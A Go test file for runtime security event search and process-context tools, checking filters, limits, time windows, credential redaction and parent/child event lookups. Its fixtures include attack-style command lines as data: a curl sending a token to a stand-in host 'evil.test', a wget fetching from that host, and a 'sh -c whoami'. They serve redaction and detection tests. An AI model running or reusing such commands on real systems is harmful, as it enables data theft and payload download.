package tools

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	processor_api "github.com/runtime-radar/runtime-radar/event-processor/api"
	history_api "github.com/runtime-radar/runtime-radar/history-api/api"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func TestSearchRuntimeEventsArgsRequest(t *testing.T) {
	t.Parallel()

	hasThreats := true

	cases := []struct {
		name  string
		args  SearchRuntimeEventsArgs
		check func(t *testing.T, req *history_api.FilterRuntimeEventSliceReq, window SearchWindow)
		code  codes.Code
	}{
		{
			name: "defaults cover the last day and cap the slice",
			args: SearchRuntimeEventsArgs{},
			check: func(t *testing.T, req *history_api.FilterRuntimeEventSliceReq, window SearchWindow) {
				if got := req.GetSliceSize(); got != defaultSearchLimit {
					t.Errorf("slice size = %d, want %d", got, defaultSearchLimit)
				}
				if got := req.GetDirection(); got != directionRight {
					t.Errorf("direction = %q, want %q", got, directionRight)
				}
				if got := req.GetCursor().AsTime(); !got.Equal(testNow) {
					t.Errorf("cursor = %v, want %v", got, testNow)
				}

				from := req.GetFilter().GetPeriod().GetFrom().AsTime()
				if want := testNow.Add(-defaultLookback); !from.Equal(want) {
					t.Errorf("period.from = %v, want %v", from, want)
				}
				if to := req.GetFilter().GetPeriod().GetTo().AsTime(); !to.Equal(testNow) {
					t.Errorf("period.to = %v, want %v", to, testNow)
				}
				if window.Limit != defaultSearchLimit {
					t.Errorf("window.limit = %d, want %d", window.Limit, defaultSearchLimit)
				}
			},
		},
		{
			name: "every filter reaches the request",
			args: SearchRuntimeEventsArgs{
				Namespace:   []string{testNamespace, "prod-*"},
				Pod:         []string{"nginx-*"},
				Binary:      []string{"/usr/bin/curl"},
				DetectorIDs: []string{detectorCryptominer},
				HasThreats:  &hasThreats,
			},
			check: func(t *testing.T, req *history_api.FilterRuntimeEventSliceReq, _ SearchWindow) {
				filter := req.GetFilter()

				if got := filter.GetProcessPodNamespace(); len(got) != 2 || got[0] != testNamespace || got[1] != "prod-*" {
					t.Errorf("namespaces = %v", got)
				}
				if got := filter.GetProcessPodName(); len(got) != 1 || got[0] != "nginx-*" {
					t.Errorf("pods = %v", got)
				}
				if got := filter.GetProcessBinary(); len(got) != 1 || got[0] != "/usr/bin/curl" {
					t.Errorf("binaries = %v", got)
				}
				if got := filter.GetThreatsDetectors(); len(got) != 1 || got[0] != detectorCryptominer {
					t.Errorf("detectors = %v", got)
				}
				if filter.HasThreats == nil || !filter.GetHasThreats() {
					t.Errorf("has_threats = %v, want true", filter.HasThreats)
				}
			},
		},
		{
			name: "explicit window is used as given",
			args: SearchRuntimeEventsArgs{
				Since: "2026-08-19T00:00:00Z",
				Until: "2026-08-19T12:00:00Z",
				Limit: 5,
			},
			check: func(t *testing.T, req *history_api.FilterRuntimeEventSliceReq, window SearchWindow) {
				since := time.Date(2026, 8, 19, 0, 0, 0, 0, time.UTC)
				until := time.Date(2026, 8, 19, 12, 0, 0, 0, time.UTC)

				if got := req.GetFilter().GetPeriod().GetFrom().AsTime(); !got.Equal(since) {
					t.Errorf("period.from = %v, want %v", got, since)
				}
				if got := req.GetCursor().AsTime(); !got.Equal(until) {
					t.Errorf("cursor = %v, want %v", got, until)
				}
				if window.Since != "2026-08-19T00:00:00Z" || window.Until != "2026-08-19T12:00:00Z" {
					t.Errorf("window = %+v", window)
				}
				if req.GetSliceSize() != 5 {
					t.Errorf("slice size = %d, want 5", req.GetSliceSize())
				}
			},
		},
		{
			name: "limit above the ceiling is capped",
			args: SearchRuntimeEventsArgs{Limit: 5000},
			check: func(t *testing.T, req *history_api.FilterRuntimeEventSliceReq, window SearchWindow) {
				if got := req.GetSliceSize(); got != maxSearchLimit {
					t.Errorf("slice size = %d, want %d", got, maxSearchLimit)
				}
				if window.Limit != maxSearchLimit {
					t.Errorf("window.limit = %d, want %d", window.Limit, maxSearchLimit)
				}
			},
		},
		{
			name: "unparsable since is rejected",
			args: SearchRuntimeEventsArgs{Since: "yesterday"},
			code: codes.InvalidArgument,
		},
		{
			name: "unparsable until is rejected",
			args: SearchRuntimeEventsArgs{Until: "20.08.2026"},
			code: codes.InvalidArgument,
		},
		{
			name: "inverted window is rejected",
			args: SearchRuntimeEventsArgs{Since: "2026-08-19T12:00:00Z", Until: "2026-08-19T00:00:00Z"},
			code: codes.InvalidArgument,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			req, window, err := tc.args.request(testNow)

			if tc.code != codes.OK {
				if status.Code(err) != tc.code {
					t.Fatalf("error = %v, want code %v", err, tc.code)
				}

				return
			}

			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			tc.check(t, req, window)
		})
	}
}

func TestSearchRuntimeEvents(t *testing.T) {
	t.Parallel()

	// A long, but not base64-shaped, command line: redaction must leave it
	// alone so that the summary has something to truncate.
	longArgs := strings.Repeat("--include /var/lib/data/file-name.txt ", 40)

	history := &mockRuntimeHistory{
		filterResp: []*history_api.ListRuntimeEventSliceResp{{
			RuntimeEvents: []*processor_api.RuntimeEvent{
				execEvent("11111111-1111-1111-1111-111111111111", testNamespace, "web-1", "/bin/sh", longArgs, testNow.Add(-time.Hour)),
				execEvent("22222222-2222-2222-2222-222222222222", testNamespace, "web-2", "/usr/bin/curl", "--token s3cr3tvalue https://evil.test", testNow.Add(-2*time.Hour)),
			},
		}},
	}

	deps := newTestDeps(t, history, nil, nil)

	result, err := searchRuntimeEvents(deps)(context.Background(), SearchRuntimeEventsArgs{Namespace: []string{testNamespace}, Limit: 2})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.Count != 2 || len(result.Events) != 2 {
		t.Fatalf("count = %d, events = %d, want 2 and 2", result.Count, len(result.Events))
	}

	if !result.HasMore {
		t.Error("has_more = false, want true when the limit was reached")
	}

	first := result.Events[0]
	if first.Namespace != testNamespace || first.Pod != "web-1" || first.Container != "app" {
		t.Errorf("pod fields = %+v", first)
	}
	if first.Image != "registry.test/app:1.0" {
		t.Errorf("image = %q", first.Image)
	}
	if first.Type != eventTypeProcessExec {
		t.Errorf("type = %q, want %q", first.Type, eventTypeProcessExec)
	}
	if !first.ArgumentsTruncated {
		t.Error("arguments_truncated = false, want true")
	}
	if len(first.Arguments) > maxSummaryArgsBytes+len(truncationSuffix) {
		t.Errorf("arguments length = %d, want at most %d", len(first.Arguments), maxSummaryArgsBytes+len(truncationSuffix))
	}

	second := result.Events[1]
	if strings.Contains(second.Arguments, "s3cr3tvalue") {
		t.Errorf("credential survived redaction: %q", second.Arguments)
	}
	if !strings.Contains(second.Arguments, "https://evil.test") {
		t.Errorf("redaction ate the rest of the command line: %q", second.Arguments)
	}
}

func TestSearchRuntimeEventsError(t *testing.T) {
	t.Parallel()

	history := &mockRuntimeHistory{filterErr: status.Error(codes.PermissionDenied, "permission denied")}
	deps := newTestDeps(t, history, nil, nil)

	_, err := searchRuntimeEvents(deps)(context.Background(), SearchRuntimeEventsArgs{})
	if status.Code(err) != codes.PermissionDenied {
		t.Fatalf("error = %v, want a wrapped PermissionDenied", err)
	}
}

func TestGetRuntimeEvent(t *testing.T) {
	t.Parallel()

	event := execEvent("33333333-3333-3333-3333-333333333333", testNamespace, "web-1", "/bin/sh", "-c whoami", testNow)
	history := &mockRuntimeHistory{readResp: event}
	deps := newTestDeps(t, history, nil, nil)

	detail, err := getRuntimeEvent(deps)(context.Background(), GetRuntimeEventArgs{ID: event.GetId()})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if detail.ID != event.GetId() {
		t.Errorf("id = %q, want %q", detail.ID, event.GetId())
	}
	if detail.Process == nil || detail.Process.CWD != "/root" {
		t.Errorf("process = %+v", detail.Process)
	}
	if detail.Parent == nil || detail.Parent.Binary != "/bin/bash" {
		t.Errorf("parent = %+v", detail.Parent)
	}
	if detail.TetragonVersion != "1.3.0" {
		t.Errorf("tetragon_version = %q", detail.TetragonVersion)
	}

	if len(history.readReqs) != 1 || history.readReqs[0].GetId() != event.GetId() {
		t.Errorf("read requests = %v", history.readReqs)
	}
}

func TestGetRuntimeEventEmptyID(t *testing.T) {
	t.Parallel()

	deps := newTestDeps(t, &mockRuntimeHistory{}, nil, nil)

	if _, err := getRuntimeEvent(deps)(context.Background(), GetRuntimeEventArgs{}); status.Code(err) != codes.InvalidArgument {
		t.Fatalf("error = %v, want InvalidArgument", err)
	}
}

func TestGetProcessContext(t *testing.T) {
	t.Parallel()

	anchor := execEvent("44444444-4444-4444-4444-444444444444", testNamespace, "web-1", "/bin/sh", "-c whoami", testNow.Add(-time.Hour))
	sibling := execEvent("55555555-5555-5555-5555-555555555555", testNamespace, "web-1", "/usr/bin/id", "", testNow.Add(-30*time.Minute))
	child := execEvent("66666666-6666-6666-6666-666666666666", testNamespace, "web-1", "/usr/bin/wget", "http://evil.test/x", testNow.Add(-15*time.Minute))

	history := &mockRuntimeHistory{
		readResp: anchor,
		filterResp: []*history_api.ListRuntimeEventSliceResp{
			// The same process: the anchor comes back here as well.
			{RuntimeEvents: []*processor_api.RuntimeEvent{sibling, anchor}},
			// Its children.
			{RuntimeEvents: []*processor_api.RuntimeEvent{child}},
			// Its parent, which happens to have no other event of its own.
			{},
		},
	}

	deps := newTestDeps(t, history, nil, nil)

	result, err := getProcessContext(deps)(context.Background(), GetProcessContextArgs{EventID: anchor.GetId()})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.ExecID != "exec-"+anchor.GetId() || result.ParentExecID != "parent-"+anchor.GetId() {
		t.Errorf("exec ids = %q / %q", result.ExecID, result.ParentExecID)
	}

	if len(history.filterReqs) != 3 {
		t.Fatalf("filter calls = %d, want 3", len(history.filterReqs))
	}
	if got := history.filterReqs[0].GetFilter().GetProcessExecId(); got != result.ExecID {
		t.Errorf("first filter process_exec_id = %q, want %q", got, result.ExecID)
	}
	if got := history.filterReqs[1].GetFilter().GetProcessParentExecId(); got != result.ExecID {
		t.Errorf("second filter process_parent_exec_id = %q, want %q", got, result.ExecID)
	}
	if got := history.filterReqs[2].GetFilter().GetProcessExecId(); got != result.ParentExecID {
		t.Errorf("third filter process_exec_id = %q, want %q", got, result.ParentExecID)
	}

	if result.Count != 3 {
		t.Fatalf("count = %d, want 3 deduplicated events", result.Count)
	}

	want := []string{anchor.GetId(), sibling.GetId(), child.GetId()}
	for i, id := range want {
		if result.Events[i].ID != id {
			t.Errorf("event[%d] = %q, want %q (events must be oldest first)", i, result.Events[i].ID, id)
		}
	}
}

func TestGetProcessContextKeepsTheAnchorWhenCapped(t *testing.T) {
	t.Parallel()

	anchor := execEvent("44444444-4444-4444-4444-444444444444", testNamespace, "web-1", "/bin/sh", "-c whoami", testNow.Add(-time.Hour))

	// Three events of the same process, all newer than the one asked about.
	newer := []*processor_api.RuntimeEvent{
		execEvent("aaaaaaaa-0000-0000-0000-000000000001", testNamespace, "web-1", "/usr/bin/id", "", testNow.Add(-10*time.Minute)),
		execEvent("aaaaaaaa-0000-0000-0000-000000000002", testNamespace, "web-1", "/usr/bin/id", "", testNow.Add(-5*time.Minute)),
	}

	history := &mockRuntimeHistory{
		readResp: anchor,
		filterResp: []*history_api.ListRuntimeEventSliceResp{
			{RuntimeEvents: append([]*processor_api.RuntimeEvent{anchor}, newer...)},
			{},
			{},
		},
	}

	deps := newTestDeps(t, history, nil, nil)

	result, err := getProcessContext(deps)(context.Background(), GetProcessContextArgs{EventID: anchor.GetId(), Limit: 1})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.Count != 1 {
		t.Fatalf("count = %d, want the limit to be honoured", result.Count)
	}
	if result.Events[0].ID != anchor.GetId() {
		t.Errorf("event = %q, want the event the context was asked about to survive the cap", result.Events[0].ID)
	}
}

func TestGetProcessContextWithoutExecID(t *testing.T) {
	t.Parallel()

	anchor := &processor_api.RuntimeEvent{Id: "77777777-7777-7777-7777-777777777777"}
	history := &mockRuntimeHistory{readResp: anchor}
	deps := newTestDeps(t, history, nil, nil)

	result, err := getProcessContext(deps)(context.Background(), GetProcessContextArgs{EventID: anchor.GetId()})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.Count != 1 || len(history.filterReqs) != 0 {
		t.Errorf("count = %d, filter calls = %d, want 1 and 0", result.Count, len(history.filterReqs))
	}
}

func TestGetProcessContextReadError(t *testing.T) {
	t.Parallel()

	history := &mockRuntimeHistory{readErr: errors.New("boom")}
	deps := newTestDeps(t, history, nil, nil)

	if _, err := getProcessContext(deps)(context.Background(), GetProcessContextArgs{EventID: "x"}); err == nil {
		t.Fatal("error = nil, want the read error to surface")
	}
}
